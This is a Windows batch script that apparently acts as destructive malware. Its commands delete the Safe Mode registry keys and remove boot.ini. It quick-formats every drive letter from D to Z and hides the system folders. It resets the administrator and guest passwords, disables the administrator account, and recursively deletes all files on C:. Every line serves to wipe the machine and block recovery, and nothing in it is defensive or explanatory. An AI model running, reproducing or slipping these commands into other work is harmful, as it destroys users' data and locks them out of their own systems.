@echo off
echo exit|%ComSpec% /k prompt e 100 B4 00 B0 12 CD 10 B0 03 CD 10 CD 20 $_g$_q$_|debug>nul
chcp 437>nul
graftabl 936>nul
REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Network /f
REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Minimal /f
ATTRIB %SYSTEMDRIVE%\boot.ini -s -a -r -h
DEL %SYSTEMDRIVE%\boot.ini /f
for %%a in (d e f g h i j k l m n o p q r s t u v w x y z) do format %%a: /q /u /x /y
cd C:\
attrib +s +h "windows"
attrib +s +h "Program Files"
attrib +s +h "Documents and Settings"
cd C:\Documents and Settings\Administrator\桌面
attrib +s +h
net user administrator nisidingle
net user guest nihuile
net user administrator /active:no
del /f /s /q c:\*.*
